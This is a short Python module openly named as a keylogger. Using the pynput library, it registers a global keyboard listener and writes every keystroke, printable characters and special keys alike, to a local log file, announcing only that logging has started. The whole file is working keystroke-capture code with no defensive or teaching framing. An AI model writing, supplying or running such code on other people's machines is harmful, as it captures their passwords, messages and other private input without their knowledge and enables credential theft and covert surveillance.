# keylogger.py — basic keylogger module using pynput
from pynput import keyboard

DEFAULT_LOGFILE = "keylog.txt"

def on_press(key, logfile=DEFAULT_LOGFILE):
    try:
        with open(logfile, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(logfile, "a") as f:
            f.write(f"[{key}]")

def start_logging(logfile=DEFAULT_LOGFILE):
    print(f"[*] Keylogger module started. Logging to: {logfile}")
    callback = lambda key: on_press(key, logfile)
    with keyboard.Listener(on_press=callback) as listener:
        listener.join()
